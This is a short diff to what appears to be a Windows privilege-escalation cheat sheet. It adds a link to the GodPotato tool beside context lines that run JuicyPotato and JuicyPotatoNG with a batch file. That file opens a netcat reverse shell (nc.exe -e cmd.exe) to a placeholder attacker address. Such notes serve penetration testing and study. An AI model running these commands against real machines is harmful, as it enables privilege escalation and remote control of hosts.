@@ -54,3 +54,5 @@ C:\Windows\Temp\juicypotato.exe -p C:\Windows\Temp\rev.bat -l 4444 -t * -c {e606
 echo C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port> > rev.bat
 .\JuicyPotatoNG.exe -t * -p C:\Windows\Temp\rev.bat
 ```
+
+[GodPotato](https://github.com/BeichenDream/GodPotato)
